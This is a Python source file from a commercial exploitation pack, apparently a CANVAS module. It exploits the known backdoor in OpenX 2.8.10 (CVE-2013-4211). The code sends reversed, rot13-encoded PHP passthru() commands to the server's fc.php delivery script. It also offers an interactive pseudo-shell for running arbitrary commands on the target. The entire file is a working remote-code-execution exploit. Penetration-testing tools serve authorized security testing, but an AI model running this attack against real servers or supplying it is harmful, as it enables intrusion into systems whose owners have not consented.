#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2012
#

import sys, time, os, re, thread

sys.path.append(".")
sys.path.append("../../")

import canvasengine
from ExploitTypes.php_multi import *
from exploitutils import *
from libs.spkproxy import header, body

from tcpexploit import tcpexploit
import StringIO

NAME = "d2sec_openx_backdoor"
VERSION = "0.1"
DESCRIPTION = "OpenX Backdoor"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"], ["Windows"] ]

DOCUMENTATION = {}
DOCUMENTATION["Versions Affected"] = "2.8.10"
DOCUMENTATION["Date public"] = "2012/03/15"
DOCUMENTATION["References"] = """
http://www.heise.de/security/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html
http://forum.openx.org/index.php?showtopic=503521628
"""
DOCUMENTATION["CVE Name"] = "CVE-2013-4211"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4211"
DOCUMENTATION["Notes"] = """

Use arg shell:1 in commandline to "simulate" a comand shell. 

"""

class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.name = NAME
    self.host = ""
    self.port = 80 
    self.https = 0
    self.uri = '/openx/'
    self.cmd = ''
    self.shell = 0
	
  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port",self.port))
    self.https = int(self.argsDict.get("https",self.https))
    self.uri = self.argsDict.get("uri",self.uri)
    self.cmd = self.argsDict.get("cmd",self.cmd)
    self.shell = int(self.argsDict.get("shell",self.shell))

  def run_backdoor(self, proto, cmd):
    try:
      import pycurl
    except Exception, e:
      self.log('[D2] %s' % e)
      self.log('[D2] Install module python-pycurl')
      return 0
    data = status = ''
    content = StringIO.StringIO()
    try:
      c = pycurl.Curl()
      c.setopt(pycurl.URL, "%s://%s%s/www/delivery/fc.php?file%%5fto%%5fserve=flowplayer/3.1.1/flowplayer-3.1.1.min.js&script=deliveryLog%%3avastServeVideoPlayer%%3aplayer"%(proto, self.host, self.uri))
      if proto == "https":
        c.setopt(c.SSL_VERIFYPEER, 0)
        c.setopt(c.SSL_VERIFYHOST, 0)
      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
      cmd = cmd[::-1]
      c.setopt(pycurl.POSTFIELDS, "vastPlayer=%s"%cmd.encode('rot13'))
      c.setopt(pycurl.POST, 1)
      #c.setopt(pycurl.FOLLOWLOCATION, 1)
      c.setopt(c.TIMEOUT, 15)
      c.setopt(pycurl.WRITEFUNCTION, content.write)

      c.perform()
      status = c.getinfo(pycurl.HTTP_CODE) 
      data = content.getvalue()
      c.close()
    except Exception, e:
      self.log('[D2] %s' % e)
      return ''
    return (status, data)

  def pseudo_shell(self, proto):
    while 1:
      strs = raw_input('openx $> ')
      if strs == 'quit' or strs == 'exit':
        break
      cmd = "passthru('%s');"%strs
      (status, data) = self.run_backdoor(proto, cmd)
      time.sleep(0.1)
      self.log(data)


  def run(self):
    self.getargs()
    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
    if self.https: 
      proto = 'https'
    else:
      proto = 'http'
    if not self.shell:
      cmd = "passthru('%s');"%self.cmd
      (status, data) = self.run_backdoor(proto, cmd)
      time.sleep(0.1)
      self.log('[D2] %s\n%s'%(self.cmd,data))
    else:
      self.pseudo_shell(proto)
    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
    return 1

  def usage(self):
    print "Usage: %s -v version -t targethost -l localip -d localport -O cmd:command -O shell:0|1 [-O uri:uri]\n" % sys.argv[0]
    i = 0
    print 'Available versions:'
    for listline in targets.values():
      print '\t%d: %s'%(i, listline)
      i = i + 1
    sys.exit(0)

if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
